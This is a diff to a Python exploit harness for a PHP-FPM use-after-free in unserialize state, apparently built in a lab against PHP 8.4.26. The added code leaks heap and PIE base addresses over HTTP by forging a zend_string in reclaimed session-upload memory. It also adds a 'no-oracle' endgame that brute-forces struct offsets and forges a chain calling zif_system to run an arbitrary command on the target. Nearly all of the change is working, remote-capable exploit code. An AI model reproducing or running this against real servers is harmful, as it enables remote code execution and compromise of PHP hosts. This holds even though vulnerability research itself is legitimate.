@@ -22,7 +22,9 @@ BG(unserialize) stale state:
 
 Lab-only aid: the /proc/<pid>/mem oracle reads BG(unserialize).data (d),
 the worker's PIE base and buffer addresses, making the reclaim deterministic
-to calibrate.  The remote (no-oracle) leak remains future work.
+to calibrate.  `no-oracle` removes that oracle from the exploit path: it takes the two
+absolute bases from an HTTP-only stale-string OOB leak, from --chunk/--pie,
+or from /proc/<pid>/maps, then brute-forces the two struct slots.
 
 Subcommands:
   lifecycle        worker-death matrix (pre- vs post-RINIT OOM)
@@ -33,6 +35,9 @@ Subcommands:
   reclaim-probe    A + patterned B, read back d via oracle (sweep pad sizes)
   primitive        A + B with forged benign var_entries (observable via app.php)
   endgame          A + B with forged ref/array/zif_system chain (RCE proof file)
+  leak             HTTP-only chunk/PIE leak from a stale session string
+  no-oracle        endgame without /proc/<pid>/mem (HTTP leak, --chunk/--pie,
+                   or local maps)
   chain            full pipeline (primitive or endgame phase)
   patchcheck       run lifecycle+oracle+producer+probe on 8.4.26 vs 8.4.27
 """
@@ -40,6 +45,7 @@ Subcommands:
 from __future__ import annotations
 
 import argparse
+import json
 import os
 import re
 import socket
@@ -538,7 +544,7 @@ def cmd_primitive(args) -> int:
     IS_LONG zval planted inside the reclaim buffer -> reflected by app.php.
 
     Reclaim geometry (lab 8.4.26, calibrated at runtime via the oracle):
-    3 pad fields of 4096 + one big field of SIZE=12288 place a buffer that
+    3 pad fields of 4096 + one big field of SIZE=16384 place a buffer that
     covers d at content offset K (probed with a marker run against a 404
     endpoint).  The consumer B MUST carry a file part after the progress
     field, otherwise rfc1867 never fires the pre-RINIT session_start and
@@ -552,7 +558,7 @@ def cmd_primitive(args) -> int:
     chainapp = Target(args.base + "/app.php")
     builder = Target(args.builder)
     oracle = Oracle(args.version)
-    size, need = 12288, 0x440
+    size, need = 16384, 0x440
 
     for _attempt in range(4):
         try:
@@ -713,7 +719,9 @@ def cmd_endgame(args) -> int:
             d = _arm_stale(base, builder, oracle, args.size)
             k = _probe_cover(chain404, oracle, d, need, size)
             if k is None:
-                return 1
+                print("[*] probe found no cover; "
+                      "falling back to the two-slot no-oracle geometry")
+                return cmd_no_oracle(args)
             d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
         except (RuntimeError, OSError) as exc:
             # a dead worker (stale /proc pid) or a missed arm: rebuild the
@@ -765,6 +773,260 @@ def _scan_pattern(oracle: Oracle, pattern: bytes) -> int | None:
         if off >= 0:
             return start + off
     return None
+
+
+def _zif_offset(version: str) -> int:
+    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    with open(path, encoding="utf-8") as handle:
+        return int(json.load(handle)["libphp"]["zif_system"], 16)
+
+
+def _no_oracle_geometry(
+        version: str) -> tuple[int, list[tuple[int, int]], list[int]]:
+    fallback = (16384, [(0x81000, 0xFE8), (0x82000, 0x1FE8),
+                        (0x81000, 0x1FE8), (0x82000, 0xFE8)],
+                [4096, 4096, 4096])
+    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    try:
+        with open(path, encoding="utf-8") as handle:
+            fpm = json.load(handle)["fpm"]["no_oracle"]
+        return (int(fpm["reclaim_size"]),
+                [(int(c["d_off"], 16), int(c["k"], 16))
+                 for c in fpm["candidates"]],
+                [int(x) for x in fpm.get("reclaim_pads", [4096, 4096, 4096])])
+    except (OSError, KeyError, TypeError, ValueError):
+        return fallback
+
+
+def _leak_geometry(version: str) -> dict | None:
+    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    try:
+        with open(path, encoding="utf-8") as handle:
+            leak = json.load(handle)["fpm"]["leak"]
+    except (OSError, KeyError, TypeError):
+        return None
+    try:
+        return {
+            "arm_path": str(leak["arm_path"]),
+            "pads": [int(x) for x in leak["pads"]],
+            "size": int(leak["size"]),
+            "header_content_off": int(leak["header_content_off"], 16),
+            "read_len": int(leak["read_len"], 16),
+            "chunk_ptr_off": int(leak["chunk_ptr_off"], 16),
+            "chunk_base_off": int(leak["chunk_base_off"], 16),
+            "pie_ptr_off": int(leak["pie_ptr_off"], 16),
+            "pie_base_off": int(leak["pie_base_off"], 16),
+        }
+    except (KeyError, TypeError, ValueError):
+        return None
+
+
+def _dechunk(body: bytes) -> bytes:
+    """Decode an HTTP chunked body; return it unchanged when not chunked."""
+    if not re.match(rb"^[0-9a-fA-F]+\r\n", body):
+        return body
+    out = bytearray()
+    pos = 0
+    while pos < len(body):
+        eol = body.find(b"\r\n", pos)
+        if eol < 0:
+            break
+        try:
+            size = int(body[pos:eol], 16)
+        except ValueError:
+            return body
+        pos = eol + 2
+        if size == 0:
+            break
+        out += body[pos:pos + size]
+        pos += size
+        if body[pos:pos + 2] == b"\r\n":
+            pos += 2
+    return bytes(out)
+
+
+def leak_bases_http(base_url: str, builder_url: str,
+                    version: str) -> tuple[int, int]:
+    """Leak PIE and Zend-MM chunk bases over HTTP only.
+
+    The stale short-session string is pointed at a forged zend_string
+    header in a reclaimed big field.  Its length spans the stale zval
+    array (chunk pointer) and the execute_ex handler table (PIE pointer).
+    The leak read is repeated because the worker aborts after answering.
+    """
+    geom = _leak_geometry(version)
+    if geom is None:
+        raise RuntimeError(f"no HTTP leak geometry for PHP {version}")
+    chain = Target(base_url)
+    app = Target(base_url + "/app.php")
+    builder = Target(builder_url)
+    size = geom["size"]
+    read_len = geom["read_len"]
+    header = geom["header_content_off"]
+    content = bytearray(size)
+    struct.pack_into("<I", content, header, 0x40000000)      # refcount
+    struct.pack_into("<I", content, header + 4, 6)           # IS_STRING
+    struct.pack_into("<Q", content, header + 8, 0)           # h
+    struct.pack_into("<Q", content, header + 0x10, read_len) # len
+    fill = min(read_len, size - header - 0x18)
+    content[header + 0x18:header + 0x18 + fill] = b"Q" * fill
+    parts = [{"name": f"pad{i}", "data": b"C" * pad}
+             for i, pad in enumerate(geom["pads"])]
+    parts.append({"name": "big", "data": bytes(content)})
+    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
+    parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
+    for attempt in range(10):
+        try:
+            builder.get(geom["arm_path"], cookie=b"PHPSESSID=" + OOM_SID)
+            chain.get("/app.php", cookie=b"PHPSESSID=" + OOM_SID)
+            ref_session_post(builder, REF_SID)
+            _status, _headers, body = app.post_multipart(
+                parts, b"HTTPLEAK", cookie=b"PHPSESSID=" + REF_SID,
+                timeout=180.0)
+            raw = _dechunk(body)
+            idx = raw.find(b"r\t")
+            if idx < 0:
+                continue
+            read = raw[idx + 2:idx + 2 + read_len]
+            if len(read) < read_len:
+                continue
+            chunk_ptr = struct.unpack_from("<Q", read,
+                                           geom["chunk_ptr_off"])[0]
+            pie_ptr = struct.unpack_from("<Q", read,
+                                         geom["pie_ptr_off"])[0]
+            chunk = chunk_ptr - geom["chunk_base_off"]
+            pie = pie_ptr - geom["pie_base_off"]
+            if not (0x700000000000 <= chunk_ptr < 0x800000000000):
+                continue
+            if not (0x550000000000 <= pie_ptr < 0x570000000000):
+                continue
+            if chunk & 0x1fffff or pie & 0x1fffff:
+                continue
+            if chunk_ptr & 0xfff:
+                continue
+            print(f"[*] HTTP leak attempt {attempt}: "
+                  f"chunk=0x{chunk:x} pie=0x{pie:x}")
+            return pie, chunk
+        except (OSError, RuntimeError, TimeoutError):
+            continue
+    raise RuntimeError("HTTP leak failed (all reads short or invalid)")
+
+
+def _local_bases(version: str) -> tuple[int, int]:
+    """PIE base and Zend-MM chunk base from /proc/<pid>/maps only.
+
+    This deliberately does not open /proc/<pid>/mem: it is the local-lab
+    fallback for the memory oracle (maps + the profile symbol offset).
+    Remote targets use leak_bases_http() instead.
+    """
+    pid = find_pool_worker(version, "chain")
+    if pid is None:
+        raise RuntimeError(f"no php-fpm 'chain' worker for {version}")
+    exe = os.readlink(f"/proc/{pid}/exe")
+    pie = None
+    chunk = None
+    with open(f"/proc/{pid}/maps", encoding="utf-8") as handle:
+        for line in handle:
+            parts = line.split()
+            start_s, end_s = parts[0].split("-")
+            start, end = int(start_s, 16), int(end_s, 16)
+            if len(parts) >= 6 and parts[-1] == exe:
+                if pie is None or start < pie:
+                    pie = start
+            if chunk is None and "rw-p" in parts[1] and end - start == MEM_CHUNK:
+                chunk = start
+    if pie is None or chunk is None:
+        raise RuntimeError("could not derive PIE/chunk bases from maps")
+    return pie, chunk
+
+
+def cmd_leak(args) -> int:
+    """Leak the chunk and PIE bases over HTTP and print them."""
+    try:
+        pie, chunk = leak_bases_http(args.base, args.builder, args.version)
+    except (OSError, RuntimeError) as exc:
+        print(f"[!] {exc}")
+        return 1
+    print(f"[+] chunk=0x{chunk:x} pie=0x{pie:x}")
+    return 0
+
+
+def cmd_no_oracle(args) -> int:
+    """HTTP-only endgame: no /proc/<pid>/mem reads at exploit time.
+
+    The absolute heap/PIE bases are stable for the lifetime of the FPM
+    master (workers are forked from it).  By default they are leaked over
+    HTTP; --chunk/--pie override the leak and /proc/<pid>/maps is a local
+    fallback.  The reclaim geometry is normalized with one throw-away
+    pads+big request to a 404 endpoint (same allocation shape as
+    _probe_cover, no scanning), then the (d-offset, content-offset) pair
+    is brute-forced over the two slots and their possible cover offsets.
+    """
+    pie = getattr(args, "pie", 0)
+    chunk = getattr(args, "chunk", 0)
+    if not chunk or not pie:
+        try:
+            pie, chunk = leak_bases_http(args.base, args.builder, args.version)
+            print("[*] bases from HTTP stale-string leak: "
+                  f"pie=0x{pie:x} chunk=0x{chunk:x}")
+        except (OSError, RuntimeError) as exc:
+            print(f"[!] HTTP leak failed: {exc}")
+            try:
+                pie, chunk = _local_bases(args.version)
+            except (OSError, RuntimeError) as local_exc:
+                print(f"[!] cannot auto-detect bases locally: {local_exc}")
+                print("    pass --chunk/--pie (stable for the FPM master lifetime)")
+                return 1
+            print("[*] bases from /proc/<pid>/maps (no /proc/<pid>/mem): "
+                  f"pie=0x{pie:x} chunk=0x{chunk:x}")
+    zif = pie + _zif_offset(args.version)
+    size, candidates, pads = _no_oracle_geometry(args.version)
+    command = args.command.encode("latin1")
+    if not command or b"\x00" in command:
+        print("[!] command must be non-empty and contain no NUL bytes")
+        return 1
+    if len(command) > 0x57:
+        print(f"[!] command too long ({len(command)} > 87 bytes)")
+        return 1
+    proof = (args.proof_file or "out/p1").lstrip("/")
+    base = Target(args.base)
+    chain404 = Target(args.base + "/nope.php")
+    chainapp = Target(args.base + "/app.php")
+    builder = Target(args.builder)
+    local_proof = os.path.join(LAB, "webroot", proof)
+
+    print(f"[*] no-oracle: chunk=0x{chunk:x} pie=0x{pie:x} zif=0x{zif:x}")
+    for attempt in range(8):
+        d_off, k = candidates[attempt % len(candidates)]
+        d = chunk + d_off
+        try:
+            os.remove(local_proof)
+        except OSError:
+            pass
+        # arm #1, then normalize the post-arm heap with a pads+big request
+        # that has the same allocation shape as the calibrated probe.
+        big_session_post(builder, OOM_SID, args.size)
+        producer_get(base, OOM_SID)
+        parts = [{"name": f"pad{i}", "data": b"C" * pad}
+                 for i, pad in enumerate(pads)]
+        parts.append({"name": "big", "data": b"\x00" * size})
+        chain404.post_multipart(parts, b"NORACLE0", timeout=120.0)
+        # rebuild the ref session and re-arm
+        ref_session_post(builder, REF_SID)
+        big_session_post(builder, OOM_SID, args.size)
+        producer_get(base, OOM_SID)
+        forged = _build_endgame_payload(d, k, size, zif, command)
+        status, _h, _b = _consume_b(chainapp, forged)
+        print(f"[*] attempt {attempt}: d=0x{d:x} k=0x{k:x} status={status}")
+        for _ in range(4):
+            time.sleep(0.35)
+            pstatus, _ph, pbody = base.get("/" + proof)
+            if pstatus == 200 and pbody:
+                print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
+                return 0
+        print("    no proof, retrying")
+    print(f"[!] no proof at /{proof}")
+    return 1
 
 
 def cmd_chain(args) -> int:
@@ -836,9 +1098,12 @@ def main() -> int:
                         default="primitive")
     parser.add_argument("--command", default="id>out/p1")
     parser.add_argument("--proof-file", default="out/p1")
+    parser.add_argument("--chunk", type=lambda x: int(x, 0), default=0)
+    parser.add_argument("--pie", type=lambda x: int(x, 0), default=0)
     sub = parser.add_subparsers(dest="cmd", required=True)
     for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
-                 "reclaim-probe", "primitive", "endgame", "chain", "patchcheck"):
+                 "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
+                 "leak", "no-oracle"):
         sub.add_parser(name)
     args = parser.parse_args()
     dispatch = {
@@ -852,6 +1117,8 @@ def main() -> int:
         "endgame": cmd_endgame,
         "chain": cmd_chain,
         "patchcheck": cmd_patchcheck,
+        "leak": cmd_leak,
+        "no-oracle": cmd_no_oracle,
     }
     return dispatch[args.cmd](args)
 
